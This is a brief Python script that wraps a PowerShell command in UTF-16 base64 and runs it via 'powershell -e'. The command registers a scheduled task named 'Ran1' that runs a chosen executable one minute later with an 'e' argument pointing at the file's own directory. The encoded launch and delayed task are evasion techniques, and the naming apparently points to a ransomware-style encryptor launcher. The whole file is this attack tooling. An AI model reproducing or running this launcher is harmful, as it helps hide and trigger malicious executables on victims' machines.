from base64 import b64encode
from subprocess import run
from sys import argv

def craft_payload(file_loc):
    time_cmd = 'Get-Date (Get-Date).addminutes(1) -Format "HH:mm"'
    payload = f"""
$action = New-ScheduledTaskAction -Execute "{file_loc}" -Argument "e {DIR}"

$trigger = New-ScheduledTaskTrigger -Once -At $({time_cmd})

Register-ScheduledTask -TaskName "Ran1" -Action $action -Trigger $trigger
"""
    
    final = b"\x00".join([i.encode() for i in payload])
    final += b"\x00"
    
    return b64encode(final)

if __name__ == "__main__":
    if len(argv) <= 2:
        filex = input("Input file full path to exec: ")
    else:
        filex = argv[1]
        
    DIR = filex[:filex.rfind('\\')+1]

    payload = craft_payload(filex)
    run(["powershell", "-e", payload])
